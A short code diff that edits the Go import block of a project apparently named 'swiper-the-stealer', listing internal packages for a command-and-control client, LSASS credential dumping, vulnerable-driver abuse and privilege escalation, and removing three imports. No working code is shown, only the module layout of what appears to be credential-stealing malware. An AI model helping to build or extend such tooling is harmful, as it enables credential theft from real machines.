@@ -14,10 +14,7 @@ import (
 	"swiper-the-stealer/internal/byovd"
 	"swiper-the-stealer/internal/c2client"
 	"swiper-the-stealer/internal/config"
-	"swiper-the-stealer/internal/crypto"
 	"swiper-the-stealer/internal/lsass"
-	"swiper-the-stealer/internal/privesc"
-	"swiper-the-stealer/internal/service"
 	"swiper-the-stealer/pkg/logger"
 )
 
